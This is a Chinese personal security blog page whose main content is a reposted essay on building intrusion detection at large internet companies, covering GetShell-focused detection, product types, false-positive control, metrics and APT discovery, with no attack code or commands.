<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一半技术 一半生活">
<meta property="og:type" content="website">
<meta property="og:title" content="SY0U&#39;s Blog">
<meta property="og:url" content="http://wsygoogol.github.io/index.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="一半技术 一半生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SY0U&#39;s Blog">
<meta name="twitter:description" content="一半技术 一半生活">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-About-the-Blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/08/About-the-Blog/" class="article-date">
  <time datetime="2016-06-08T10:54:05.000Z" itemprop="datePublished">2016-06-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/08/About-the-Blog/">About the Blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjbohpb4100037o1by54fxyij" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-大型互联网企业入侵检测实战总结" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/27/大型互联网企业入侵检测实战总结/" class="article-date">
  <time datetime="2017-12-27T03:12:00.000Z" itemprop="datePublished">2017-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://blkstone.github.io/2017/11/21/intrusion-detection-in-big-company/" target="_blank" rel="external">转</a></p>
<h1 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h1><p>UEBA (User and Entity Behavior Analytics)<br>RASP (Runtime Application Self-Protection)<br>HIDS (Host-based Intrusion Detection System) 有一种Agent的感觉<br>NIDS (Network Intrusion Detection System)<br>Sandbox<br>SIEM/SOC (Security Information and Event Management, 安全信息和事件管理, Security Operation Center, 安全运营中心)<br>Splunk<br>Kibana</p>
<h1 id="博主点评"><a href="#博主点评" class="headerlink" title="博主点评"></a>博主点评</h1><p>把入侵检测聚焦于攻击者<code>GetShell</code>以及<code>GetShell之后</code>的操作，明确目标(不在乎你利用什么漏洞，我们只关注你所使用的shellcode和之后的行为，目标是发现获取shell之后的利用行为)<br>不再在无效攻击告警(尝试攻击成功但未getshell，根据场景举例可能是受限用户的SQL注入)空耗人力。<br>博主曾经做过一阵子 SIEM/SOC 运营，深刻感受到 <strong>告警爆炸</strong> 所产生的问题，对于 SIEM/SOC 系统，强而有效的 <strong>告警去重</strong> 机制是非常必要的。</p>
<p>对行为监控 (行为主要指针对主机/shell的操作)<br>依赖于行为基线的UEBA，行为基线的设立可以应用机器学习(聚类)。</p>
<p>另外此文对APT的常见 <strong>攻击路径</strong> 总结得不错，防御的要点也是让攻击者的攻击路径尽可能收敛，从而在几条关键路径上尽可能设防。</p>
<h1 id="备份信息"><a href="#备份信息" class="headerlink" title="备份信息"></a>备份信息</h1><p>大型互联网企业入侵检测实战总结<br>原文刊载于知乎专栏，作者为 “职业欠钱”。</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>入侵检测是每一个大型互联网企业都要面对的一个难题。</p>
<p>比如，你怎么知道，当前自己公司是不是已经被黑了？是真的没人来黑，还是别人黑了自己没有能力感知到？</p>
<p>价值越大的公司，面临入侵的威胁越大，像Yahoo！这样的互联网鼻祖，在落幕时仍遭遇全量数据失窃的事情，一旦发生在轻资产的数据化公司身上，后果不堪想象。</p>
<p>基于保密的考虑，本文不会提及任何具体的策略。希望直接照搬入侵策略的同学可能会失望，但一些思路分享出来，希望得到大家的指点，如能对大家产生些许帮助，也是一个非常令人开心的事。</p>
<p>限于个人认知，如有谬误，欢迎同行指点。</p>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><ul>
<li>入侵的定义：恶意攻击者不经授权控制我方资源</li>
<li>我们要发现什么样的入侵： GetShell以及GetShell之后的行为上</li>
<li>入侵和内鬼：内鬼不在入侵检测讨论范围，移步内部风险控制和审计</li>
<li>入侵检测的本质：区分未授权的动作，可以模式匹配、异常检测，通过加固让合法行为带标签可简化检测模型</li>
<li>入侵检测与攻击向量：不存在“通用入侵检测模型”，必须结合“攻击向量”具体分析</li>
<li>常见入侵手法与应对：杜绝高危端口，优先聚焦Web GetShell</li>
<li>入侵检测基本原则：减少“误报”是关键</li>
<li>主流的入侵检测产品形态：HIDS（服务器和终端类似）、NIDS、沙箱、RASP、SIEM/SOC</li>
<li>入侵检测效果评价指标：主动检出率、可运营的场景覆盖率</li>
<li>影响入侵检测的关键要素：系统健康度（保证每一台主机、每一时刻、每一个策略都健康运行）</li>
<li>如何发现APT：等待实施APT的人犯错，高级的0day、木马并不是APT的代言词</li>
<li>AI在入侵检测领域的正确姿势：别让AI专家领衔，让业务专家提需求，把AI当工具而不是解决方案</li>
</ul>
<h1 id="什么是入侵"><a href="#什么是入侵" class="headerlink" title="什么是入侵"></a>什么是入侵</h1><p>电影里典型的入侵场景：</p>
<p>坏人在很远的地方，通过网络控制你的笔记本、手机、机房的服务器、网络设备，进而随意的读你（笔记本、手机、服务器、网络设备里）的隐私数据（窃取数据）、用你的设备上的功能，实现坏人的意图，比如使用手机的麦克风窃听你在说什么，使用笔记本的摄像头偷窥你在看什么，使用服务器的计算能力挖矿，使用网络能力发动DDOS攻击等等……</p>
<p>所以，入侵，就是恶意攻击者（俗称黑客），不经授权的控制、使用我方资源（读写文件、执行命令、控制网络资源等）。广义上，黑客使用SQL注入窃取数据，或者拿到了你在域名ISP里的帐号，可以篡改DNS指向一个黑页，又或者找到了你的社交帐号，在微博/QQ/邮箱上，对虚拟资产进行控制，都叫入侵。</p>
<h1 id="我们要发现什么样的入侵"><a href="#我们要发现什么样的入侵" class="headerlink" title="我们要发现什么样的入侵"></a>我们要发现什么样的入侵</h1><p>企业里的入侵检测，多数时候，需要发现的是狭义上的入侵 —— 一般指黑客对PC、服务器、工作网络（包括办公网、生产网）的控制行为。</p>
<p>而对PC、服务器等资产的控制，最主流的方法是通过SHELL去下发指令，获得SHELL的这个动作叫做GetShell。常见的方式有通过Web服务的上传漏洞，拿到WebShell，或者利用RCE漏洞直接执行命令（存在漏洞的页面，变相的提供了一个SHELL环境）。另外，也有通过某种方式先植入木马后门，后续直接利用木马集成的SHELL功能对目标进行控制。</p>
<p>因此，入侵检测重点关注的，是GetShell这个动作，以及GetShell成功之后的恶意行为（为了扩大战果，黑客多半会利用Shell进行探测、翻找窃取、横向移动攻击其它内部目标）。至于有一些同行（包括业界产品），喜欢关注GetShell之前的一些“外部扫描、攻击尝试”行为，在笔者看来基本上是没有意义的。因为一个成功的产品、优秀的公司，外部的扫描和尝试攻击无时无刻不在持续发生的，我们得习惯这是常态，并在这样的常态下去对抗，有什么加固的策略，可以一开始就做，持续的运营，如果有什么策略是无法持续运营的，多半也就不是一个有效的策略了。</p>
<p>而类似于SQL注入、XSS等一些不直接GetSHell的Web攻击，暂时不在狭义的“入侵检测”考虑范围，而是可以划入“漏洞”、“威胁感知”等领域，另行探讨。当然，利用SQL注入、XSS等入口，进行了GetShell操作的，我们仍抓GetShell这个关键点，而不讨论漏洞入口本身。</p>
<h1 id="“入侵”和“内鬼”"><a href="#“入侵”和“内鬼”" class="headerlink" title="“入侵”和“内鬼”"></a>“入侵”和“内鬼”</h1><p>与入侵接近的一种场景是内鬼。入侵本身是手段，GetShell只是开始，目的是为了之后对资源的控制和数据的窃取。而内鬼本身拥有合法的权限，可以合法接触敏感资产，但是基于工作以外的目的对这些资源进行非法处置，包括拷贝副本、转移外泄、篡改数据牟利等。</p>
<p>内鬼的行为不在“入侵检测”的范畴，一般从内部风险控制的视角进行管理和审计，比如职责分离、双人审计等。也有数据防泄密产品，DLP对其进行防御，这里不展开。</p>
<p>有时候，黑客知道员工A有权限接触目标资产，于是定向攻击员工A，利用员工A的权限把数据窃取走，也定性为“入侵”。毕竟A不是主观恶意的内鬼。如果不能在黑客攻击A的那一刻捕获（军方级对手可能会拥有0day无法防御，免杀木马无法检测），或者无法区分黑客控制的A窃取数据，和正常员工A的访问数据，那这个入侵检测就是失败的。</p>
<h1 id="入侵检测的本质"><a href="#入侵检测的本质" class="headerlink" title="入侵检测的本质"></a>入侵检测的本质</h1><p>前面已经说过入侵就是坏人可以不经过你的同意，操作你的资产，手段并没有任何限制。那么如何找出入侵行为和合法正常行为的区别，将其跟合法行为分类开，就是“入侵发现”。在模型上，它其本质是一个标记问题（入侵、非入侵）。</p>
<p>可惜的是，入侵这种动作的“黑”样本特别稀少，想通过大量的数据去训练入侵检测模型，找出入侵的规律，比较难。因此，入侵检测策略人员，往往需要投入大量的时间，去提炼更精准的表达模型，或者花更多的精力去构造“类似入侵”的模拟数据。一个经典的例子是，为了对抗webshell，行业人员往往去GitHub上搜索一些公开的webshell样本，数量大约是不到1000个。而对于机器学习动辄百万级的训练需求，这是远远不够的。</p>
<p>此时，针对已知样本做技术分类，提炼更精准的模型，被称为传统的特征工程，被视为效率低下的重复劳动，但效果往往比较可以预期。而构造大量的恶意样本，虽然有机器学习、AI等光环加持，但在实际环境中往往难以获得成功 —— 自动生成的样本很难描述webshell本来的含义，多半描述的是自动生成的算法特征。</p>
<p>另一个方面，入侵的区别是看行为本身是否“授权”，而授权与否本身是没有任何显著的区分特征的。因此，做入侵对抗的时候，如果能够通过某种加固，将合法的访问收敛到有限的通道，并且给该通道做出强有力的区分，也就能大大的降低入侵检测的成本 —— 例如，对访问来源进行严格的认证，无论是自然人，还是程序API，都要求持有合法票据，而派发票据时，针对不同情况做多纬度的认证，再用权限控制台针对这些票据记录和监控它们可以访问的范围。</p>
<p>这也是Google的BeyondCorp无边界网络得以实施的前提和基础。</p>
<p>因此，入侵检测的主要思路也就有2种：</p>
<ol>
<li>根据特征进行模式匹配；（黑特征法，例如WebShell关键字匹配）</li>
<li>根据业务历史行为（生成基线模型），对入侵行为做异常对比；（非白既黑），如果业务的历史行为不够收敛，就用加固的手段对其进行收敛，再挑出不合规的小众异常行为。</li>
</ol>
<p>入侵检测与攻击向量</p>
<p>根据目标不同，可能暴露给黑客的攻击面，和黑客可以采用的入侵手法，也完全不同。比如，入侵你手头的PC/笔记本，和入侵部署在机房/云上的服务器，攻击和防御的方法完全不同。</p>
<p>针对一个明确的“目标”，它被访问的渠道可能是有限集，被攻击的必经路径也有限。一个可以成功入侵的 攻击方法 + 目标 合并起来，就称为一个“攻击向量”。</p>
<p>因此，谈入侵检测模型效果时，需要先明确攻击向量，针对不同的攻击路径，采集对应的数据，才可能做对应的检测模型。比如，基于SSH登录后的SHELL命令采集，是不会让你发现Webshell的攻击的。而基于网络流量的采集数据，也不会让你获悉黑客是否在SSH后的SHELL环境里执行了什么文件切割打包的动作。</p>
<p>基于此，如果有人说自己的模型可以无视场景发现APT，那就是在扯犊子。首先你得先把APT对应的攻击向量罗列出来，每一个细分场景是否拥有数据，是否具备发现能力，都要单独去建设的。</p>
<h1 id="常见的入侵手法与应对"><a href="#常见的入侵手法与应对" class="headerlink" title="常见的入侵手法与应对"></a>常见的入侵手法与应对</h1><p>做入侵检测的，如果对黑客入侵的常见手法、流程理解不足，就容易抓不住重点，有时候会陷入“政治正确”的陷阱里 —— 比如渗透测试团队说，我做了A动作，你无法发现，请你解决。而该场景是否真的危险，在全局的范围内如何排序，解决它耗费的成本和带来的收益如何，都需要有专业经验做支撑来决策。</p>
<p>下面说说经典教程里，黑客的入侵流程（完整过程可以参考杀伤链模型）：</p>
<p>黑客要入侵一个目标之前，对该目标是一无所知的，所以第一件事，是“踩点” ——也就是搜集信息。比如，我要黑的目标，有哪些资产（域名、IP、网站服务），它们各自的状态如何，是否存在已知的漏洞（工具），管理他们的人有谁，存在哪些已知的泄漏信息（比如社工库里的密码等）……</p>
<p>一旦踩点完成，核心的思路就是根据目标找出对应的漏洞、攻击策略进行渗透，比如：</p>
<h2 id="1-高危服务入侵"><a href="#1-高危服务入侵" class="headerlink" title="1. 高危服务入侵"></a>1. 高危服务入侵</h2><p>所有的公共服务都叫做高危端口，因为该协议、实现该协议的开源组件，可能存在已知的攻击路径（甚至未知的0day），只要你的价值足够高，黑客有足够的资源去挖掘攻击手法，那么当你把高危端口开启的那一刻，就相当于为黑客打开了大门。</p>
<p>比如SSH、RDP端口开放，这些端口是给管理员维护系统用的，只要知道密码，黑客就能通过该端口获得服务器的权限，完成入侵。黑客可能通过暴力猜解密码，获得凭据，也可能通过其它方式拿到登录凭据。</p>
<p>或许，你的密码设置得非常强壮，但是这并不是你可以把该端口继续暴露在互联网的理由，我们应该把这些端口限制好，只允许自己的IP（或者内部的堡垒主机）访问，彻底断掉黑客通过它入侵我们的可能。</p>
<p>与此类似的，MySQL、Redis、FTP、SMTP、MSSQL、Rsync等等，凡是自己用来管理服务器或者数据库、文件的服务，都不应该给互联网打开。否则，蠕虫化的攻击工具会在短短几分钟内攻破你的服务，甚至直接加密你的数据，要求你支付比特币进行勒索。</p>
<p>还有一些高危服务存在RCE漏洞（远程命令执行），只要端口开放，黑客就能利用现成的exploit，直接GetShell。</p>
<p>防御建议： 在这里做入侵检测的必要性不高，因为高危服务的具体所指非常的多，不一定存在通用的特征，所以，通过加固方式，收敛攻击入口才是更有效的策略。禁止所有高危端口对互联网开放即可。</p>
<h2 id="2-Web入侵"><a href="#2-Web入侵" class="headerlink" title="2. Web入侵"></a>2. Web入侵</h2><p>随着高危端口的加固，黑客知识库里的攻击手法很多都会失效了。但是Web服务是现代互联网公司的主要服务形式，不可能也都关掉。于是，基于PHP、JAVA、ASP/<a href="http://ASP.NET%E3%80%81NODE%E3%80%81C%E5%86%99%E7%9A%84cgi%E7%AD%89%E7%AD%89%E5%8A%A8%E6%80%81%E7%9A%84Web%E6%9C%8D%E5%8A%A1%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B0%B1%E5%8F%98%E6%88%90%E4%BA%86%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E7%9A%84%E6%9C%80%E4%B8%BB%E8%A6%81%E7%9A%84%E5%85%A5%E5%8F%A3%E4%BA%86%E3%80%82/" target="_blank" rel="external">http://ASP.NET、NODE、C写的cgi等等动态的Web服务本身的漏洞，就变成了黑客入侵的最主要的入口了。</a></p>
<p>比如利用上传功能直接上传一个WebShell、利用文件包含功能，直接引用执行一个远程的WebShell、利用代码执行的功能，直接当作SHELL的入口执行任意命令，利用解析一些图片、视频的功能，上传一个恶意的样本，触发解析库的漏洞……</p>
<p>这里的细分手法是一个专门的领域（道哥专门写了本《白帽子讲Web安全》），当然，由于它们都是由Web服务做为入口的，所以，入侵检测的时候，也总有一些办法，找到黑客GetShell和正常业务行为的一些区别。</p>
<p>这里，基于WAF日志、Access Log、Auditd记录的系统调用或者SHELL指令，网络层面上针对response包体里的特征，都可能提炼出很多攻击手法，建议主要的精力放在这里。</p>
<h2 id="3-0day入侵"><a href="#3-0day入侵" class="headerlink" title="3. 0day入侵"></a>3. 0day入侵</h2><p>通过NSA泄漏的工具包来看，早些年他们是拥有直接攻击Apache、Nginx这些服务的能力的。这意味着对手很可能有一些我们不知道的漏洞，神不知鬼不觉就GetShell了。</p>
<p>但是对于入侵检测而言，这并不重要 ： 因为我们从来不在乎你利用什么漏洞，我们只关注你所使用的shellcode和之后的行为。Apache存在0day漏洞被攻击，还是一个php页面存在低级的漏洞被攻击，从入侵的行为上来看，说不定是完全一样的，入侵检测模型可以通用。</p>
<p>所以，多把精力聚焦在有哪些黑客手法上，会比关注存在哪些漏洞更有价值 —— 当然，具体漏洞还是要实际投入跟进和测试，验证模型的效果。</p>
<h2 id="4-通过办公网入侵"><a href="#4-通过办公网入侵" class="headerlink" title="4. 通过办公网入侵"></a>4. 通过办公网入侵</h2><p>绝大多数APT报告里，黑客是先对人下手，比如发个邮件，哄骗你打开后，控制了你的PC，再进行长期的观察/翻阅，拿到你的合法凭据后，再到内网漫游。这一部分，由于之前的合作里，是另一个团队负责的，所以就不展开了。其实这里才是APT对抗的重头戏，业界多数产品也是围绕这里，而不是IDC的服务器，很遗憾没有太多的实战经验，希望以后有机会可以在这个领域做出一些事情。</p>
<h1 id="入侵检测基本原则"><a href="#入侵检测基本原则" class="headerlink" title="入侵检测基本原则"></a>入侵检测基本原则</h1><ol>
<li>不能把每一条告警都彻底跟进的模型，等同于无效模型 ——有入侵了再说之前有告警，只是太多了没跟过来/没查彻底，这是马后炮，等同于不具备发现能力；</li>
<li>我们必须屏蔽一些重复发生的相似的误报告警，以集中精力对每一个告警都闭环掉 —— 这会产生白名单，也就是漏报，因此单个模型的漏报是不可避免的；</li>
<li>由于任何单模型都会存在漏报，所以我们必须在多个纬度上做多个模型，形成纵深 —— 假设WebShell静态文本分析被黑客变形绕过了，在RASP（运行时环境）的恶意调用还可以监控到，这样可以选择接受单个模型的漏报，但在整体上仍然不漏；</li>
<li>任何模型都有误报漏报，我们做什么，不做什么，需要考虑的是“性价比” —— 比如某些变形的WebShell可以写成跟业务代码非常相似，人的肉眼几乎无法识别，再追求一定要在文本分析上进行对抗，就是性价比很差的决策，通过RASP的检测方案，其性价比更高一些；</li>
<li>我们不可能知道黑客所有的攻击手法，也不可能针对每一种手法都建设策略（不具备性价比），但是，针对重点业务，我们可以通过加固的方式，让黑客能攻击的路径极度收敛，仅在关键环节进行对抗（包括加固的有效性检测）可能会让100%的目标变得现实</li>
</ol>
<p>基于上述几个原则，我们可以知道一个事实，或许，我们永远不可能在单点上做到100分，但是，我们可以通过一些组合方式，让攻击者很难绕过所有的点。</p>
<p>当老板或者蓝军挑战，为何漏过某个单点的行为时，其实可以换个思维，看其是否能完全不触碰全局防御体系的实现攻击目标。如果为了“政治正确”，在某个单点上进行无止境的投入，最终可能只是在试图制造一个永动机，纯粹浪费人力、资源，而不产生实际的收益。</p>
<h1 id="入侵检测产品的主流形态"><a href="#入侵检测产品的主流形态" class="headerlink" title="入侵检测产品的主流形态"></a>入侵检测产品的主流形态</h1><p>入侵检测终究是要基于数据去建模，比如针对WebShell的检测，首先要识别web目录，再对里面的文件进行文本分析，这需要做一个采集器。</p>
<p>基于SHELL命令的入侵检测模型，需要获取所有SHELL命令，这可能要Hook系统调用或者劫持SHELL。</p>
<p>基于网络IP信誉、流量payload进行检测，或者基于邮件网关对内容的检查，可能要植入网络边界里，对流量进行旁路采集。</p>
<p>也有一些集大成者，基于多个sensor，将应用日志进行采集后，汇总在一个SOC或者SIEM，再交由大数据平台进行分析运算模型，因此，业界的产品大致上就分成了以下的形态：</p>
<ol>
<li><strong>主机Agent类</strong> ：黑客攻击了主机后，在主机上进行的动作，可能会产生日志、进程、命令、网络等记录，那么在主机上部署一个采集器（也内含一部分检测规则），就叫做基于主机的入侵检测系统，简称HIDS；</li>
</ol>
<p>典型的产品：OSSEC、云盾、360、安全狗，当然，一些APT厂商，往往也有在主机上的sensor/agent，比如FireEye等</p>
<ol>
<li><strong>网络检测类</strong> ：由于多数攻击向量是会通过网络对目标进行一些payload的投放，或者控制目标，因此，这些payload和控制协议，就会有一定的特征，在网络层面可以识别出来；</li>
</ol>
<p>典型的产品：Snort，到商业的各种NIDS/NIPS，如今的威胁情报检测系统TIP，也属于这一类；</p>
<ol>
<li><strong>日志集中存储类</strong> ：这一类产品允许主机、网络设备、应用都输出各自的日志，集中到一个统一的后台，在这个后台，对各类日志进行综合的分析，判断是否可以关联的把一个入侵行为的多个路径刻画出来，例如A主机的的Web访问日志里显示遭到了扫描和攻击尝试，继而主机层面多了一个陌生的进程和网络连接，最后A主机对内网其它主机进行了横向渗透尝试……；</li>
</ol>
<p>典型的产品：Splunk, Kibana，各种SIEM解决方案</p>
<ol>
<li><strong>网关沙箱执行类</strong> ：本质上这类产品是类型2（网络检测类）的一种子集，只不过它不重点监控恶意特征（绕过的姿势太多，而且有加密的手法使得payload完全无法被检测），因此，此类产品往往部署在网关出入口，或者邮件等服务器前面，通过协议分析，识别流量里的文件，通过虚拟机/沙箱的模拟执行（很多鱼叉攻击的附件），如果发现类似于doc文件被word打开后，派生CMD之类的异常行为（触发网络下载行为、调用了危险的系统函数等都算），就可以把它拦截或者告警出来；</li>
</ol>
<p>典型产品：FirEye、PaloAuto</p>
<ol>
<li><strong>主机安全防御产品</strong> ：本质上它也是类型1的一种子集，但是大家可能更耳熟能详 —— 主流的杀毒软件（此时可以成为终端安全管理方案），会严密的监控主机上的一举一动，比如下载了一个文件、启动了一个程序，都可以触发一次安全检查。它和类型1的主要区别，是工作在系统更底层，并且多数逻辑是在本地而非后台；严格一些的产品，比如Bit9，甚至会通过白名单的方式，允许特定的进程运行，而阻止一切未知的新的文件，哪怕是黑客控制了服务器，试图植入木马长期潜伏，也可能因为此安全机制而失效。</li>
</ol>
<p>典型产品：Bit9、SEP、赛门铁克、卡巴斯基…</p>
<h1 id="入侵检测效果评价指标"><a href="#入侵检测效果评价指标" class="headerlink" title="入侵检测效果评价指标"></a>入侵检测效果评价指标</h1><p>首先，主动发现的入侵案例/所有入侵 = 有效发现率。这个指标一定是最直观的。</p>
<p>比较麻烦的是分母，很多真实发生的入侵，如果外部不反馈，我们又没检测到，它就不会出现在分母里，所以有效发现率总是虚高的，谁能保证当前所有的入侵都发现了呢？</p>
<p>而且，真实的入侵其实是一个低频行为 —— 毕竟，我们的目标是不发生入侵，应该提前加固好，不给黑客可趁之机才对。很久没出现真实入侵案例，这个指标长期不变化，是无法刻画入侵检测能力的提升的。</p>
<p>所以一般还会引入2个指标来观测：</p>
<ol>
<li>蓝军对抗主动发现率</li>
<li>已知场景建成覆盖率</li>
</ol>
<p>蓝军主动对抗和演习，弥补真实入侵事件低频的缺陷，但是由于蓝军掌握的攻击手法往往也是有限的，他们多次演习后，手法和场景可能会被罗列完毕，这里的建设和补漏不会那么及时。</p>
<p>所以，把已知攻击手法的建成覆盖率拿出来，也是一个侧面评价指标。</p>
<p>入侵检测团队把精力聚焦在已知攻击手法的优先级评估和快速覆盖上，对建设到什么程度是满足需要的，要有自己的专业判断。（参考入侵检测原则里的“性价比”原则）</p>
<p>比如，我们目前制定的新策略上线前的验收标准是：</p>
<ol>
<li>单场景日均工单&lt;X单，峰值&lt;Y单；所有场景日平均&lt;Z，峰值&lt;XX，超出该指标的策略不予接收，不视为具备对应能力；</li>
<li>同IP、相同业务模块（类似属性）多次触碰相同规则，具备自动抑制能力，首次出现告警，多次出现自动合并；</li>
<li>具备误报自学习能力</li>
<li>具备可读性（有清晰的风险阐述、关键信息、处理指引、辅助信息或者索引，便于定性）</li>
<li>策略上线前需要自测(输出自测报告)、有清晰的说明文档(运营人员按照这个文档验收)</li>
<li>策略验收完成需输出验收报告</li>
<li>不得私自调用微信、短信等接口发告警，必须走统一的告警框架(应急策略临时可开通，2-3天缓冲期，但必须用正式策略替换应急策略，或者下掉应急策略)</li>
</ol>
<p>在满足验收标准的前提下，策略人员形成文档，说明对当前场景哪些手法具备覆盖能力，哪些前提下会无法告警（考验一个人对该场景和自己模型的理解能力）。可以对策略的成熟度形成自评得分，0-100分满分，自评满足基础的覆盖能力后，可能还存在一些遗憾，它们的提高边际成本变高，很可能不会追求到极致，而是投入到下一个场景的覆盖里去。如果某个场景出现了真实对抗，又没有交叉的其它策略进行弥补，那自评满足要求的结论是要被推翻的。</p>
<h1 id="影响入侵检测的关键要素"><a href="#影响入侵检测的关键要素" class="headerlink" title="影响入侵检测的关键要素"></a>影响入侵检测的关键要素</h1><p>讨论影响入侵检测的要素时，我们可以简单看看曾经发生过哪些错误导致我们不能主动发现入侵（这里的每一条，背后可能都是一个令人遗憾的真实漏报case）：</p>
<ol>
<li>依赖于主机agent采集数据的模型，在当事机器上，没部署安装/agent挂了/数据上报过程丢失了/Bug了</li>
<li>后台数据分析模块故障（丢弃数据）</li>
<li>策略脚本Bug、没启动</li>
<li>还没建设对应的策略</li>
<li>策略的灵敏度不够（比如扫描的阈值没达到，WebShell用了变形的对抗手法）</li>
<li>模型依赖的部分基础数据错误，做出了错误的判断</li>
<li>成功告警了，但是工单应急同学错误的判断/没有跟进/辅助信息不足以定性</li>
</ol>
<p>所以，实际上，要让一个入侵事件被捕获，我们需要有专门的运营人员对以下目标负责：</p>
<ol>
<li>数据采集的完整性</li>
<li>每一个策略时刻工作正常（拨测监控）</li>
<li>针对高危场景策略要覆盖，灵敏度要满足一般对抗需要</li>
<li>依赖的基础数据要准确</li>
<li>工单运营支撑平台及追溯辅助工具完备</li>
</ol>
<p>可能有些同学会想，影响入侵检测的关键要素难道不是模型的有效性么？怎么全是这些乱七八糟的东西？</p>
<p>实际上，稍微上规模的企业，上述的每一点要长期维持在高可用标准，都非常不容易。比如懂攻防的策略同学，对基础数据质量不关心不负责，最终的效果就是明明能发现的入侵，总是有各种原因恰好发现不了。之前，笔者亲历过有大量的案例，明明对手很菜，手法很简单，但就是因为这些因素给漏过了。</p>
<p>所以，我常感慨，以某些运营质量之差，根本轮不到跟黑客拼策略（技术）。</p>
<p>当然，一旦有兄弟帮忙去跟进这些质量运营工作之后，我们的确就真的需要拼策略了。</p>
<p>这个时候，攻击手法有那么多，凭什么先选择这个场景建设？凭什么认为建设到这个程度就足够满足对已知手法的感知了？凭什么选择发现这些样本而放弃那些样本？</p>
<p>这些极具主观性的东西，往往考验的是判断力、执行力等专业度，不能等到黑客入侵了才解释说，这个场景我们原定明年建设的……</p>
<h1 id="如何发现APT"><a href="#如何发现APT" class="headerlink" title="如何发现APT"></a>如何发现APT</h1><p>所谓APT，就是高级的持续威胁。既然是高级的，按照一般的描述，他们的木马是免杀的（不能假定我们可以发现这个木马）、他们的漏洞不公开的（不能假定我们可以加固抵抗）、他们的手法是高级的（不能假定这个手法在已知的范畴里）。</p>
<p>所以，实际上APT的意思就几乎等同于我们不能发现的入侵事件了。</p>
<p>但是，业界总还有APT检测产品、解决方案的厂商在混饭吃，他们是怎么做的呢？</p>
<p>说木马免杀的，他们用沙箱+人工分析，哪怕效率低一些，还是试图做出定性，并快速的把IOC（威胁情报）同步给其它客户，发现1例，全网都去排查。</p>
<p>说流量变形对抗的，他们用异常检测的模型，把一些不认识的可疑的IP关系、payload给识别出来 —— 当然，识别出来之后，也要运营人员跟进得仔细才能定性。</p>
<p>说攻击手法高级的，他们还是会假定黑客就用鱼叉、水坑之类的已知手法去执行，然后在邮箱附件、PC终端等环节采集日志，对用户行为进行分析，UEBA试图寻找出用户异于平常的动作。</p>
<p>那么，我们呢？</p>
<p>我没有什么好的办法，可以发现传说中的免杀的木马，但是我们可以针对已知的黑客攻击框架（比如metasploit、cobalt strike）生成的木马类型、行为进行一些特征的提取，比如DNS隧道的通讯，比如IP信誉的模型，比如默认生成的不免杀木马的共性特征等。</p>
<p>我们可以假设已经有黑客控制了某一台机器，但是它试图进行横向扩散的时候，我们有一些模型可以识别它的探测、翻找、入侵尝试等行为。</p>
<p>我们暂时还不知道如何100%发现APT，但是如果真的有APT在公司里，有本事这个团队别犯错，永远都不触碰我们所有的铃铛。否则，只要他犯错，就轮到我们出场了。</p>
